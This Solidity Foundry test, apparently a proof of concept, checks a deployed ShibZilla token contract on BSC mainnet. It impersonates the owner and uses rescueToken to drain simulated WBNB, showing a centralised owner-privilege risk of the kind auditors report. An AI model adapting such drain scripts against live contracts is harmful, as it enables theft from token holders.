```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

// Minimal interface for the ShibZilla contract
interface IShibZilla {
    function getOwner() external view returns (address);
    function rescueToken(address tokenAddress, uint256 tokens) external returns (bool success);
    function balanceOf(address account) external view returns (uint256);
}

// Standard ERC20 interface (for WBNB)
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // Deployed contract addresses (BSC mainnet)
    address constant SHIB = 0xd00a7edd637b776ec5a6461f5e7ac055f14a0c1e;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    IShibZilla shib;
    IERC20 wbnb;

    function setUp() public virtual {
        shib = IShibZilla(SHIB);
        wbnb = IERC20(WBNB);

        // Label addresses for debugging
        vm.label(SHIB, "ShibZilla");
        vm.label(WBNB, "WBNB");
    }

    function testActiveOwnerPrivilegeDrain() public {
        // Determine the current owner of the ShibZilla contract
        address owner = shib.getOwner();
        vm.label(owner, "Owner");

        // Record owner's WBNB balance before exploit
        uint256 ownerWbnbBefore = wbnb.balanceOf(owner);

        // Simulate that the ShibZilla contract holds some WBNB (e.g., from swap fees)
        // We deal 100 WBNB to the contract
        deal(WBNB, SHIB, 100 ether);
        assertEq(wbnb.balanceOf(SHIB), 100 ether, "Contract should have 100 WBNB");

        // Owner calls rescueToken to drain the WBNB
        vm.prank(owner);
        bool success = shib.rescueToken(WBNB, 100 ether);
        assertTrue(success, "rescueToken should succeed");

        // Verify that the owner received the tokens
        uint256 ownerWbnbAfter = wbnb.balanceOf(owner);
        assertEq(ownerWbnbAfter - ownerWbnbBefore, 100 ether, "Owner should gain 100 WBNB");

        // Verify that the contract's WBNB balance is now zero (or at least reduced)
        assertEq(wbnb.balanceOf(SHIB), 0, "Contract should have 0 WBNB after drain");

        // This demonstrates that the owner can unilaterally remove any ERC20 tokens
        // from the contract, a classic active owner privilege exploit.
    }
}
```
